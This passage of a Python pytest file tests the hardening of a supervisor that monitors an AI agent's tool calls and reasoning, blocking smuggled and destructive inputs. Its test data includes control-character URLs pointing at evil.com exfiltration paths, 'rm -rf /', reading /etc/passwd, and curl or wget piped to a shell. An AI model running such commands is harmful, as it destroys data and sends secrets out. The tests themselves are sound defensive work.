    # SymPy methods must raise ValueError cleanly on syntax errors or non-string inputs.
    for bad_expr in ("x +", "", 123, None):
        with pytest.raises(ValueError):
            lab.verify_sympy_identity(bad_expr, "0")  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_sympy_identity("0", bad_expr)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_sympy_equation(bad_expr, "0", solve_for="x")  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_sympy_equation(bad_expr)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_sympy_calculus("diff", bad_expr, "1")  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.verify_sympy_calculus("diff", "x", bad_expr)  # type: ignore[arg-type]

    with pytest.raises(ValueError):
        lab.verify_sympy_calculus(123, "x", "1")  # type: ignore[arg-type]
    with pytest.raises(ValueError):
        lab.verify_sympy_calculus("diff", "x", "1", variable="_bad")


def test_t5_r4_6_mcts_kloster_and_quorum_reject_bool_parameters() -> None:
    for bad_init_kwargs in (
        {"horizon": True},
        {"horizon": False},
        {"samples_per_eval": True},
        {"n_bins": True},
        {"max_samples": True},
        {"seed": True},
        {"exploration_c": True},
        {"prior_weight": True},
        {"delta": True},
        {"softmax_beta": True},
        {"exploration_c": float("nan")},
        {"delta": float("nan")},
        {"softmax_beta": float("nan")},
    ):
        with pytest.raises(ValueError):
            KlosterMCTSSearch(**bad_init_kwargs)  # type: ignore[arg-type]

    mcts = KlosterMCTSSearch()
    for bad_run_kwargs in (
        {"horizon": True},
        {"max_iterations": True},
        {"n_bins": True},
        {"max_samples": True},
        {"tau": True},
        {"delta": True},
        {"tau": float("nan")},
        {"delta": float("nan")},
    ):
        with pytest.raises(ValueError):
            mcts.run("root", lambda _s: [], lambda _s: 0.5, **bad_run_kwargs)  # type: ignore[arg-type]

    p = [0.7, 0.2, 0.1]
    for bad_weights in (
        {"zoe": True, "clara": 1.0, "antigravity": 1.0, "user": 1.0},
        {"zoe": float("nan"), "clara": 1.0, "antigravity": 1.0, "user": 1.0},
        [True, 1.0, 1.0, 1.0],
        [float("inf"), 1.0, 1.0, 1.0],
        "1234",
    ):
        with pytest.raises(ValueError):
            evaluate_four_peer_quorum(p, [0.5, 0.3, 0.2], [0.6, 0.3, 0.1], [0.65, 0.25, 0.1], weights=bad_weights)  # type: ignore[arg-type]

    balance = {
        "zoe_distribution": [0.7, 0.2, 0.1],
        "clara_distribution": [0.5, 0.3, 0.2],
        "zoe_a_tau": {"tau": 0.05},
    }
    for bad_tau in (True, False, float("nan"), float("inf")):
        with pytest.raises(ValueError):
            quorum_from_dual_peer_balance(
                balance,
                antigravity_probs=[0.6, 0.3, 0.1],
                user_probs=[0.65, 0.25, 0.1],
                tau=bad_tau,
            )


# ---------------------------------------------------------------------------
# Iteration 5 Adversarial Hardening Tests (R5-1 through R5-5)
# ---------------------------------------------------------------------------


def test_t5_r5_1_control_char_url_laundering_and_destructive_command_bypass() -> None:
    smuggled_urls = (
        "http://127.0.0.1\x0b@evil.com/exfil",
        "http://127.0.0.1\x0c@evil.com/exfil",
        "http://127.0.0.1\x1c@evil.com/exfil",
        "http://127.0.0.1\x1f@evil.com/exfil",
        "http://127.0.0.1\x00@evil.com/exfil",
        "http://127.0.0.1\x7f@evil.com/exfil",
        "http://127.0.0.1\t@evil.com/exfil",
        "http://127.0.0.1\r@evil.com/exfil",
        "http://127.0.0.1\n@evil.com/exfil",
        "http://127.0.0.1\x0b.evil.com/exfil",
        "http://127.0.0.1\t@127.0.0.1/exfil",
    )
    destructive_cmds = (
        "r\x0bm -rf /",
        "r\tm -rf /",
        "c\x0bat /\x0betc/passwd",
    )

    for sanitize in (True, False):
        sup = LiveProcessSupervisor(sanitize_arguments=sanitize)
        ctx = ag_hooks.HookContext()
        for idx, bad_url in enumerate(smuggled_urls):
            assert find_non_loopback_urls({"url": bad_url}), (
                f"find_non_loopback_urls missed control-char URL: {bad_url!r}"
            )
            res = run_coro_sync(
                sup.supervise_tool_call(
                    ag_types.ToolCall(
                        id=f"tc-ctrl-url-{sanitize}-{idx}",
                        name="fetch_url",
                        args={"url": bad_url},
                    ),
                    context=ctx,
                )
            )
            assert res.allow is False, (
                f"Supervisor (sanitize={sanitize}) allowed/laundered URL {bad_url!r}: {res}"
            )

        for idx, bad_cmd in enumerate(destructive_cmds):
            res = run_coro_sync(
                sup.supervise_tool_call(
                    ag_types.ToolCall(
                        id=f"tc-ctrl-cmd-{sanitize}-{idx}",
                        name="helper_tool",
                        args={"cmd": bad_cmd},
                    ),
                    context=ctx,
                )
            )
            assert res.allow is False, (
                f"Supervisor (sanitize={sanitize}) allowed/laundered cmd {bad_cmd!r}: {res}"
            )

    # Custom arg_sanitizer must also never launder a safe arg into a blocked URL or destructive cmd.
    launder_sup = LiveProcessSupervisor(
        rules=[
            SupervisionPolicyRule(
                rule_id="launder_url",
                tool="fetch_url",
                decision=ag_policy.Decision.APPROVE,
                arg_sanitizer=lambda _tc: {"url": "https://evil.example.com/steal"},
            ),
            SupervisionPolicyRule(
                rule_id="launder_cmd",
                tool="helper_tool",
                decision=ag_policy.Decision.APPROVE,
                arg_sanitizer=lambda _tc: {"cmd": "rm -rf /tmp/laundered"},
            ),
        ]
    )
    ctx_l = ag_hooks.HookContext()
    res_l_url = run_coro_sync(
        launder_sup.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-launder-url",
                name="fetch_url",
                args={"url": "http://127.0.0.1:8080/ok"},
            ),
            context=ctx_l,
        )
    )
    assert res_l_url.allow is False

    # Benign multi-line loopback text and userinfo-stripped loopback URLs remain allowed.
    benign_sup = LiveProcessSupervisor()
    assert find_non_loopback_urls("Check http://127.0.0.1:8080/health\nNext line") == []
    res_ok = run_coro_sync(
        benign_sup.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-ok-loopback",
                name="fetch_url",
                args={"url": "http://user:pw@127.0.0.1:8080/ok"},
            ),
            context=ag_hooks.HookContext(),
        )
    )
    assert res_ok.allow is True
    assert res_ok.modified_args == {"url": "http://127.0.0.1:8080/ok"}


def test_t5_r5_2_ask_user_approved_destructive_tool_parity_in_agent_config() -> None:
    asked_calls: list[str] = []

    def _ask_handler(tc: ag_types.ToolCall, reason: str = "") -> bool:
        del reason
        cmd = str(tc.args.get("CommandLine", ""))
        asked_calls.append(cmd)
        return "safe_probe" in cmd

    def run_command(CommandLine: str) -> str:
        return f"EXECUTED:{CommandLine}"

    ask_rule = SupervisionPolicyRule(
        rule_id="ask_rm",
        tool="run_command",
        decision=ag_policy.Decision.ASK_USER,
        reason="Confirm destructive command",
        ask_user_handler=_ask_handler,
    )
    sup = LiveProcessSupervisor(rules=[ask_rule])

    # Direct supervise_tool_call allows user-approved command and denies rejected command.
    ctx = ag_hooks.HookContext()
    res_direct_ok = run_coro_sync(
        sup.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-direct-ok",
                name="run_command",
                args={"CommandLine": "rm -rf /tmp/safe_probe"},
            ),
            context=ctx,
        )
    )
    assert res_direct_ok.allow is True

    res_direct_no = run_coro_sync(
        sup.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-direct-no",
                name="run_command",
                args={"CommandLine": "rm -rf /tmp/blocked_probe"},
            ),
            context=ctx,
        )
    )
    assert res_direct_no.allow is False

    # Agent config with include_ask_user=False must preserve parity: user-approved destructive
    # command executes (not overridden by Wildcard Deny), while user-rejected command is denied.
    def _offline_handler(_prompt: str, _ctx: dict[str, Any]) -> VoiceResponse:
        return VoiceResponse(
            text="done",
            tool_calls=(
                {"name": "run_command", "args": {"CommandLine": "rm -rf /tmp/safe_probe"}},
                {"name": "run_command", "args": {"CommandLine": "rm -rf /tmp/blocked_probe"}},
            ),
        )

    cfg = sup.create_agent_config(
        mode="offline",
        tools=[run_command],
        offline_handler=_offline_handler,
    )
    assert not any(
        isinstance(p, ag_policy.Policy) and p.decision == ag_policy.Decision.ASK_USER
        for p in cfg.policies
    )

    async def _run_agent() -> str:
        async with Agent(cfg) as agent:
            resp = await agent.chat("run probes")
            return await resp.text()

    asked_calls.clear()
    agent_text = run_coro_sync(_run_agent())
    assert asked_calls == ["rm -rf /tmp/safe_probe", "rm -rf /tmp/blocked_probe"]
    assert "EXECUTED:rm -rf /tmp/safe_probe" in agent_text
    assert "EXECUTED:rm -rf /tmp/blocked_probe" not in agent_text
    assert "DENIED" in agent_text

    # Wildcard ASK_USER ("*") maps to Wildcard Allow so Wildcard Deny still overrides it.
    wildcard_sup = LiveProcessSupervisor(
        rules=[
            SupervisionPolicyRule(
                rule_id="ask_all",
                tool="*",
                decision=ag_policy.Decision.ASK_USER,
                ask_user_handler=lambda _tc, _r="": True,
            )
        ]
    )
    wc_policies = wildcard_sup.build_policies(include_ask_user=False)
    assert any(
        p.tool == "*" and p.decision == ag_policy.Decision.APPROVE and p.name == "ask_all_hook_approved"
        for p in wc_policies
    )
    assert any(
        p.tool == "*" and p.decision == ag_policy.Decision.DENY and p.name == "zoe_supervision_destructive_deny"
        for p in wc_policies
    )


def test_t5_r5_3_sandbox_ruff_add_noqa_empty_userinfo_url_and_sympy_z3_validation(
    tmp_path: Path,
) -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    # 1. Ruff --add-noqa / --add-noqa=* must be rejected in read-only sandbox.
    for forbidden_ruff in (
        ["ruff", "check", "--add-noqa", "foo.py"],
        ["ruff", "check", "--add-noqa=unused", "foo.py"],
        ["python3", "-m", "ruff", "check", "--add-noqa", "."],
    ):
        cmd, reason = lab._validate_repo_argv(forbidden_ruff)
        assert cmd == [] and reason is not None
        verdict = lab.verify_repo_command(forbidden_ruff, cwd=tmp_path)
        assert verdict.passed is False
        assert verdict.ground_truth["executed"] is False

    # 2. Empty-userinfo, backslash, and whitespace/control-char loopback URLs must be rejected.
    for bad_url in (
        "http://@127.0.0.1:8080/",
        "https://@localhost:8443/health",
        "http://evil.com\\@127.0.0.1:8080/",
        "http://127.0.0.1\t@evil.com:8080/",
        "http://127.0.0.1:8080/ with_space",
    ):
        v_url = lab.verify_loopback_http(bad_url, timeout=0.1)
        assert v_url.passed is False
        assert v_url.ground_truth.get("loopback_permitted") is False

    # 3. SymPy equation rhs & solve_for validation must raise ValueError cleanly.
    with pytest.raises(ValueError):
        lab.verify_sympy_equation("x", 0)  # type: ignore[arg-type]
    for bad_solve_for in (123, "", "_private", "123bad"):
        with pytest.raises(ValueError):
            lab.verify_sympy_equation("x == 1", solve_for=bad_solve_for)  # type: ignore[arg-type]

    # 4. Z3 timeout_ms must reject bool and non-finite / non-positive values with ValueError.
    for bad_ms in (float("nan"), float("inf"), float("-inf"), 0, -10, True, False):
        with pytest.raises(ValueError):
            lab.verify_z3_constraint("x > 0", variables={"x": "Int"}, timeout_ms=bad_ms)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            lab.check_z3_invariant("x > 0", "x >= 1", variables={"x": "Int"}, timeout_ms=bad_ms)  # type: ignore[arg-type]


def test_t5_r5_4_distillation_eliza_string_keywords_bool_rank_and_bad_at_regex(
    tmp_path: Path,
) -> None:
    bb = EpistemicBlackboard()
    m1 = bb.post_measurement("zoe", "rule", "eliza_eval", "unit", "exact", 1)
    ev1 = bb.promote_to_evidence(m1.record_id, "eliza_eval", True, "Verified rule")
    dist = System2To1Distiller(state_dir=tmp_path / "dist_state", blackboard=bb)

    def _make_trace(payload: dict[str, Any]) -> System2Trace:
        return System2Trace(
            task_prompt="distill adversarial eliza payload",
            initial_uncertainty_a_tau=2.5,
            verifier_passed=True,
            evidence_id=ev1.record_id,
            provenance={"source": "eliza_eval", "evidence_id": ev1.record_id},
            solution_code_or_rule=payload,
        )

    bad_payloads: tuple[dict[str, Any], ...] = (
        {"rule_id": "r_str_kw", "keywords": "hello", "pattern": "(.*)", "response": "hi {1}"},
        {"rule_id": "r_bytes_kw", "keywords": b"hello", "pattern": "(.*)", "response": "hi {1}"},
        {"rule_id": "r_set_kw", "keywords": {"hello"}, "pattern": "(.*)", "response": "hi {1}"},
        {"rule_id": "r_bool_rank", "keywords": ["hello"], "rank": True, "pattern": "(.*)", "response": "hi {1}"},
        {"rule_id": "r_str_rank", "keywords": ["hello"], "rank": "10", "pattern": "(.*)", "response": "hi {1}"},
        {"rule_id": "r_bad_at_kw", "keywords": ["@bad[regex"], "pattern": "(.*)", "response": "hi {1}"},
    )
    for payload in bad_payloads:
        with pytest.raises(DistillationRejectedError):
            dist.distill(_make_trace(payload), artifact_kind="eliza_rule")

    assert len(dist.rejection_log()) == len(bad_payloads)
    assert dist.summary()["active_artifacts_count"] == 0

    # Direct registry compilation also wraps invalid @-keyword regex in ValueError (not raw re.PatternError).
    reg = DistilledRuleRegistry()
    with pytest.raises(ValueError, match="invalid keyword regex"):
        reg.register_rule(
            ElizaRule(
                rule_id="direct_bad_at",
                keywords=("@bad[regex",),
                rank=10,
                decompositions=(("(.*)", ("hi",)),),
            )
        )


def test_t5_r5_5_alpha_evolve_nonfinite_weight_atol_and_counterpoint_sonify_validation(
    tmp_path: Path,
) -> None:
    for bad_w in (float("inf"), float("-inf"), float("nan"), 0.0, -1.0, True, False):
        with pytest.raises(ValueError):
            TestCase(inputs={"x": 1}, expected=1, weight=bad_w)  # type: ignore[arg-type]

    for bad_atol in (float("inf"), float("-inf"), float("nan"), -1e-6, True, False):
        with pytest.raises(ValueError):
            TestCase(inputs={"x": 1}, expected=1, atol=bad_atol)  # type: ignore[arg-type]

    verifier = ZoeDeterministicVerifier()
    src = "def f(x):\n    return x\n"
    for bad_case in (
        {"inputs": {"x": 1}, "expected": 1, "weight": float("inf")},
        {"inputs": {"x": 1}, "expected": 1, "weight": True},
        {"inputs": {"x": 1}, "expected": 1, "atol": float("nan")},
        {"inputs": {"x": 1}, "expected": 1, "atol": False},
    ):
        with pytest.raises(ValueError):
            verifier.evaluate(src, [bad_case])

    cp = CounterpointChairsEngine()
    out_wav = tmp_path / "cadence.wav"
    for bad_dur in (float("nan"), float("inf"), float("-inf"), 0.0, 0.02, 5.1, True, False):
        with pytest.raises(ValueError):
            cp.sonify_cadence_wav(out_wav, beat_duration_s=bad_dur)  # type: ignore[arg-type]

    for bad_sr in (True, False, 22050.5, 7999, 96001):
        with pytest.raises(ValueError):
            cp.sonify_cadence_wav(out_wav, sample_rate=bad_sr)  # type: ignore[arg-type]

    assert not out_wav.exists()
    meta = cp.sonify_cadence_wav(out_wav, sample_rate=22050, beat_duration_s=0.1)
    assert out_wav.is_file()
    assert meta["sample_rate"] == 22050


# ---------------------------------------------------------------------------
# Iteration 6 Adversarial Hardening Tests (R6-1 through R6-4)
# ---------------------------------------------------------------------------


def test_t5_r6_1_process_supervision_control_claims_long_flags_and_bounds() -> None:
    # 1. Control-char / whitespace-split unverified claims across thought, post-turn, & tool_call
    claim_variants = (
        "pro\x0bven without running",
        "pro\tven without running",
        "by\x0cpass firewall now",
        "i a\tm sentient",
    )
    for sanitize in (True, False):
        sup = LiveProcessSupervisor(sanitize_arguments=sanitize)
        ctx = ag_hooks.HookContext()
        for idx, text in enumerate(claim_variants):
            thought_findings = sup.supervise_thought(text)
            assert any(f.rule_id == "thought_unverified_claim" for f in thought_findings), (
                f"supervise_thought missed claim variant {text!r}"
            )
            before_count = len(sup.findings)
            sup._handle_post_turn(ctx, f"Conclusion: {text}.")
            post_findings = sup.findings[before_count:]
            assert any(f.rule_id == "post_turn_unverified_claim" for f in post_findings), (
                f"_handle_post_turn missed claim variant {text!r}"
            )
            tc_res = run_coro_sync(
                sup.supervise_tool_call(
                    ag_types.ToolCall(
                        id=f"tc-r6-claim-{sanitize}-{idx}",
                        name="helper_tool",
                        args={"msg": text},
                    ),
                    context=ctx,
                )
            )
            assert tc_res.allow is False, (
                f"supervise_tool_call (sanitize={sanitize}) allowed claim {text!r}"
            )

    # 2. Long-flag rm and path/versioned interpreter curl|wget pipe destructive patterns
    destructive_cmds = (
        "rm --recursive --force /tmp/target",
        "rm --force /tmp/target",
        "rm --recursive /tmp/target",
        "curl http://127.0.0.1:8080/x | /bin/sh",
        "curl http://127.0.0.1:8080/x | python3",
        "curl http://127.0.0.1:8080/x | /usr/bin/python3.14",
        "wget http://127.0.0.1:8080/x | /usr/bin/bash",
        "wget http://127.0.0.1:8080/x | dash",
    )
    sup_cmd = LiveProcessSupervisor(sanitize_arguments=True)
    ctx_cmd = ag_hooks.HookContext()
    for idx, cmd in enumerate(destructive_cmds):
        res_cmd = run_coro_sync(
            sup_cmd.supervise_tool_call(
                ag_types.ToolCall(
                    id=f"tc-r6-cmd-{idx}",
                    name="helper_tool",
                    args={"cmd": cmd},
                ),
                context=ctx_cmd,
            )
        )
        assert res_cmd.allow is False, f"Supervisor allowed destructive command {cmd!r}"
        t_findings = sup_cmd.supervise_thought(f"Maybe run `{cmd}`")
        assert any(f.rule_id == "thought_destructive_intent" for f in t_findings)

    # Benign pipe & benign flag still allowed
    res_benign = run_coro_sync(
        sup_cmd.supervise_tool_call(
            ag_types.ToolCall(
                id="tc-r6-benign",
                name="helper_tool",
                args={"cmd": "curl http://127.0.0.1:8080/health | jq ."},
            ),
            context=ctx_cmd,
        )
    )
    assert res_benign.allow is True

    # 3. max_timeout_sec and max_limit validation in LiveProcessSupervisor.__init__
    for bad_timeout in (float("nan"), float("inf"), float("-inf"), 0.0, 0.04, -1.0, True, False, "1.0"):
        with pytest.raises(ValueError):
            LiveProcessSupervisor(max_timeout_sec=bad_timeout)  # type: ignore[arg-type]
    for bad_limit in (0, -5, True, False, 10.5, "10"):
        with pytest.raises(ValueError):
            LiveProcessSupervisor(max_limit=bad_limit)  # type: ignore[arg-type]
    ok_sup = LiveProcessSupervisor(max_timeout_sec=0.05, max_limit=1)
    assert ok_sup.max_timeout_sec == 0.05
    assert ok_sup.max_limit == 1


def test_t5_r6_2_sandbox_ruff_output_file_z3_sympy_and_dataset_validation(
    tmp_path: Path,
) -> None:
    lab = RealitySandboxLab(repo_root=REPO_ROOT)

    # 1. Reject ruff -o / --output-file / --output-file=* while keeping --output-format allowed
    for bad_ruff in (
        ["ruff", "check", "-o", "/tmp/x.txt", "foo.py"],
        ["ruff", "check", "-o/tmp/x.txt", "foo.py"],
        ["ruff", "check", "--output-file", "/tmp/x.txt", "foo.py"],
        ["ruff", "check", "--output-file=/tmp/x.txt", "foo.py"],
        ["python3", "-m", "ruff", "check", "--output-file=/tmp/x.txt", "foo.py"],
    ):
        cmd, err = lab._validate_repo_argv(bad_ruff)
        assert cmd == [] and err is not None
        verdict = lab.verify_repo_command(bad_ruff, cwd=tmp_path)
        assert verdict.passed is False
        assert verdict.ground_truth["executed"] is False

    ok_cmd, ok_err = lab._validate_repo_argv(["ruff", "check", "--output-format", "json", "foo.py"])
    assert ok_err is None and ok_cmd == ["ruff", "check", "--output-format", "json", "foo.py"]

    # 2. Z3 non-finite float constant & Z3Exception sort mismatch translated to ValueError
    with pytest.raises(ValueError):
        lab.verify_z3_constraint("x > 1e309", variables={"x": "Int"})
    with pytest.raises(ValueError):
        lab.verify_z3_constraint("x == 1", variables={"x": "Bool"})
    with pytest.raises(ValueError):
        lab.check_z3_invariant("x == 1", "x == True", variables={"x": "Bool"})

    # 3. SymPy variables and candidate_solutions validation
    with pytest.raises(ValueError):
        lab.verify_sympy_identity("x", "x", variables=[123])  # type: ignore[list-item]
    with pytest.raises(ValueError):
        lab.verify_sympy_identity("x", "x", variables=["_priv"])
    with pytest.raises(ValueError):
        lab.verify_sympy_identity("x", "x", variables="xy")  # type: ignore[arg-type]
    with pytest.raises(ValueError):
        lab.verify_sympy_equation("x == 1", solve_for="x", candidate_solutions=123)  # type: ignore[arg-type]
    with pytest.raises(ValueError):
        lab.verify_sympy_equation("x == 1", solve_for="x", candidate_solutions="1")  # type: ignore[arg-type]

    # 4. Dataset invariant column presence, non-bool min_rows, and uniform row width
    with pytest.raises(ValueError):
        lab.verify_dataset_invariants([{"a": 1}], [{"kind": "range", "min": 0}])
    with pytest.raises(ValueError):
        lab.verify_dataset_invariants([{"a": 1}], [{"kind": "monotonic"}])
    with pytest.raises(ValueError):
        lab.verify_dataset_invariants([{"a": 1}], [{"kind": "mean_range", "min": 0}])
    with pytest.raises(ValueError):
        lab.verify_dataset_invariants([{"a": 1}], [{"kind": "unique"}])
    with pytest.raises(ValueError):
        lab.verify_dataset_invariants([{"a": 1}], [{"kind": "non_empty", "min_rows": True}])
    with pytest.raises(ValueError):
        lab.verify_dataset_invariants([[1, 2], [3]], [{"kind": "non_empty"}])


def test_t5_r6_3_distillation_atomic_rollback_and_eliza_payload_validation(
    tmp_path: Path,
) -> None:
    # 1. Atomic rollback(): if memory (or blackboard) is emergency-stopped, NEITHER store mutates
    bb = EpistemicBlackboard()
    m1 = bb.post_measurement("zoe", "skill", "ast_eval", "unit", "exact", 1)
    ev1 = bb.promote_to_evidence(m1.record_id, "ast_eval", True, "Verified skill")
    dist = System2To1Distiller(state_dir=tmp_path / "dist_atomic", blackboard=bb)

    trace_skill = System2Trace(
        task_prompt="distill add_one",
        initial_uncertainty_a_tau=2.0,
        verifier_passed=True,
        evidence_id=ev1.record_id,
        provenance={"source": "ast_eval", "evidence_id": ev1.record_id},
        solution_code_or_rule="def add_one(x):\n    return x + 1\n",
    )
    art = dist.distill(
        trace_skill,
        artifact_kind="procedural_skill",
        verification_cases=[{"inputs": {"x": 2}, "expected": 3}],
    )
    beliefs_before = len(bb.snapshot()["belief_updates"])
    skills_before = dist.memory.summary()["procedural_count"]
    assert beliefs_before == 1 and skills_before == 1

    dist.memory.emergency_stop()
    with pytest.raises(RuntimeError):
        dist.rollback(art.rollback_token)
    assert len(bb.snapshot()["belief_updates"]) == beliefs_before
    assert dist.memory.summary()["procedural_count"] == skills_before
    assert dist.summary()["active_artifacts_count"] == 1

    # Reverse direction: if blackboard is emergency-stopped, memory is NOT mutated either
    bb_stop = EpistemicBlackboard()
    m_stop = bb_stop.post_measurement("zoe", "skill", "ast_eval", "unit", "exact", 1)
    ev_stop = bb_stop.promote_to_evidence(m_stop.record_id, "ast_eval", True, "Verified skill")
    dist_stop = System2To1Distiller(state_dir=tmp_path / "dist_atomic_bb", blackboard=bb_stop)
    art_stop = dist_stop.distill(
        System2Trace(
            task_prompt="distill add_two",
            initial_uncertainty_a_tau=2.0,
            verifier_passed=True,
            evidence_id=ev_stop.record_id,
            provenance={"source": "ast_eval", "evidence_id": ev_stop.record_id},
            solution_code_or_rule="def add_two(x):\n    return x + 2\n",
        ),
        artifact_kind="procedural_skill",
        verification_cases=[{"inputs": {"x": 2}, "expected": 4}],
    )
    bb_stop.emergency_stop("test bb stop")
    with pytest.raises(RuntimeError):
        dist_stop.rollback(art_stop.rollback_token)
    assert dist_stop.memory.summary()["procedural_count"] == 1
    assert dist_stop.summary()["active_artifacts_count"] == 1

    # 2. _parse_eliza_payload validation raises DistillationRejectedError & logs rejection
    bb2 = EpistemicBlackboard()
    m2 = bb2.post_measurement("zoe", "rule", "eliza_eval", "unit", "exact", 1)
    ev2 = bb2.promote_to_evidence(m2.record_id, "eliza_eval", True, "Verified rule")
    dist2 = System2To1Distiller(state_dir=tmp_path / "dist_eliza", blackboard=bb2)

    def _eliza_trace(payload: dict[str, Any]) -> System2Trace:
        return System2Trace(
            task_prompt="bad eliza payload",
            initial_uncertainty_a_tau=2.2,
            verifier_passed=True,
            evidence_id=ev2.record_id,
            provenance={"source": "eliza_eval", "evidence_id": ev2.record_id},
            solution_code_or_rule=payload,
        )

    bad_payloads: tuple[dict[str, Any], ...] = (
        {"rule_id": "r_none_kw", "keywords": [None], "pattern": "(.*)", "response": "hi"},
        {"rule_id": "r_int_kw", "keywords": [123], "pattern": "(.*)", "response": "hi"},
        {"rule_id": "r_int_decomps", "keywords": ["hi"], "decompositions": 123},
        {"rule_id": "r_str_decomps", "keywords": ["hi"], "decompositions": "bad"},
        {"rule_id": "r_int_decomp_resps", "keywords": ["hi"], "decompositions": [("(.*)", 123)]},
        {"rule_id": "r_int_pat", "keywords": ["hi"], "pattern": 123, "response": "hi"},
        {"rule_id": "r_int_resps", "keywords": ["hi"], "pattern": "(.*)", "responses": 123},
        {"rule_id": "r_none_resp", "keywords": ["hi"], "pattern": "(.*)", "responses": [None]},
        {"rule_id": "r_int_resp", "keywords": ["hi"], "pattern": "(.*)", "response": 123},
    )
    for payload in bad_payloads:
        with pytest.raises(DistillationRejectedError):
            dist2.distill(_eliza_trace(payload), artifact_kind="eliza_rule")

    assert len(dist2.rejection_log()) == len(bad_payloads)
    assert dist2.summary()["active_artifacts_count"] == 0


def test_t5_r6_4_quorum_explicit_weights_on_peer_vectors_and_alpha_evolve_validation() -> None:
    # 1. Explicit weights passed to evaluate_four_peer_quorum override PeerConfidenceVector weights
    v_zoe = PeerConfidenceVector(
        peer_id="zoe",
        probabilities=[0.80, 0.15, 0.05],
        source_kind="document",
        provenance_id="prov:zoe:1",
        independence_tag="indep:zoe",
        labels=ACTION_LABELS,
        weight=1.0,
    )
    v_clara = PeerConfidenceVector(
        peer_id="clara",
        probabilities=[0.70, 0.20, 0.10],
        source_kind="validated_reflection",
        provenance_id="prov:clara:1",
        independence_tag="indep:clara",
        labels=ACTION_LABELS,
        weight=1.0,
    )
    v_ag = PeerConfidenceVector(
        peer_id="antigravity",
        probabilities=[0.75, 0.15, 0.10],
        source_kind="model",
        provenance_id="prov:ag:1",
        independence_tag="indep:ag",
        labels=ACTION_LABELS,
        weight=1.0,
    )
    v_user = PeerConfidenceVector(
        peer_id="user",
        probabilities=[0.72, 0.18, 0.10],
        source_kind="user",
        provenance_id="prov:user:1",
        independence_tag="indep:user",
        labels=ACTION_LABELS,
        weight=1.0,
    )
    q_weighted = evaluate_four_peer_quorum(
        v_zoe,
        v_clara,
        v_ag,
        v_user,
        weights={"zoe": 100.0, "clara": 1.0, "antigravity": 1.0, "user": 1.0},
    )
    assert q_weighted.normalized_weights[0] == pytest.approx(100.0 / 103.0, abs=1e-9)
    assert q_weighted.normalized_weights[1:] == pytest.approx((1.0 / 103.0,) * 3, abs=1e-9)

    # When weights is None, intrinsic PeerConfidenceVector weights remain preserved
    v_zoe_w3 = PeerConfidenceVector(
        peer_id="zoe",
        probabilities=[0.80, 0.15, 0.05],
        source_kind="document",
        provenance_id="prov:zoe:2",
        independence_tag="indep:zoe",
        labels=ACTION_LABELS,
        weight=3.0,
    )
    q_intrinsic = evaluate_four_peer_quorum(v_zoe_w3, v_clara, v_ag, v_user)
    assert q_intrinsic.normalized_weights[0] == pytest.approx(3.0 / 6.0, abs=1e-9)

    # 2. AlphaEvolveLoop / EvolutionaryArchive / AntigravityProgramMutator bool & missing expected checks
    for bad_int in (True, False, 0, -1):
        with pytest.raises(ValueError):
            EvolutionaryArchive(num_islands=bad_int)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            EvolutionaryArchive(migration_interval=bad_int)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            AlphaEvolveLoop(num_islands=bad_int)  # type: ignore[arg-type]
        with pytest.raises(ValueError):
            AlphaEvolveLoop(offspring_per_gen=bad_int)  # type: ignore[arg-type]

    for bad_bool_seed in (True, False):
        with pytest.raises(ValueError):
            AlphaEvolveLoop(seed=bad_bool_seed)
        with pytest.raises(ValueError):
            AntigravityProgramMutator(seed=bad_bool_seed)

    for bad_temp in (True, False, 0.0, -0.1, float("nan"), float("inf")):
        with pytest.raises(ValueError):
            EvolutionaryArchive(temperature=bad_temp)  # type: ignore[arg-type]

    verifier = ZoeDeterministicVerifier()
    with pytest.raises(ValueError, match="expected"):
        verifier.evaluate("def f(x):\n    return x\n", [{"inputs": {"x": 1}}])


def test_t5_r7_1_process_supervision_separated_rm_env_pipes_and_rule_precedence() -> None:
    sup = LiveProcessSupervisor(sanitize_arguments=True)
    ctx = ag_hooks.HookContext()

    destructive_vectors = (
        "rm -v -r /tmp/target",
        "rm -v -f /tmp/target",
        "/bin/rm -v -rf /tmp/target",
        "curl http://127.0.0.1:8080/x | env sh",
        "curl http://127.0.0.1:8080/x | /usr/bin/env bash",
        "curl http://127.0.0.1:8080/x | /usr/bin/env -i FOO=bar sh",
        "wget http://127.0.0.1:8080/x | env python3",
    )
    for idx, cmd in enumerate(destructive_vectors):
        res = run_coro_sync(
            sup.supervise_tool_call(
                ag_types.ToolCall(
                    id=f"tc-r7-1-{idx}",
                    name="helper_tool",
                    args={"cmd": cmd},
                ),
                context=ctx,
            )
        )
        assert res.allow is False, f"Supervisor allowed destructive vector {cmd!r}"
        thought_findings = sup.supervise_thought(f"I will run {cmd}")
        assert any(f.rule_id == "thought_destructive_intent" for f in thought_findings), (
            f"supervise_thought missed destructive vector {cmd!r}"
        )

    # Positive controls: safe rm without -r/-f and non-shell env pipe remain allowed
    for idx, safe_cmd in enumerate(
        (
            "rm readme.txt",
            "curl http://127.0.0.1:8080/health | env grep ok",
        )
    ):
        res_ok = run_coro_sync(
            sup.supervise_tool_call(
                ag_types.ToolCall(
                    id=f"tc-r7-1-ok-{idx}",
                    name="helper_tool",
                    args={"cmd": safe_cmd},
                ),
                context=ctx,
            )
        )
        assert res_ok.allow is True, f"Safe command unexpectedly blocked: {safe_cmd!r}"

    # Precedence alignment: specific high-priority APPROVE beats wildcard DENY,
    # matching google.antigravity.hooks.policy.enforce(sup.build_policies(...))
    sup_prec = LiveProcessSupervisor(
        rules=[
            SupervisionPolicyRule(
                rule_id="spec_allow",
                tool="read_file",
                decision=ag_policy.Decision.APPROVE,
                priority=10,
            ),
            SupervisionPolicyRule(
                rule_id="wc_deny",
                tool="*",
                decision=ag_policy.Decision.DENY,
                priority=0,
                reason="wildcard deny",
            ),
        ]
    )
    tc_read = ag_types.ToolCall(id="tc-prec-read", name="read_file", args={"path": "README.md"})
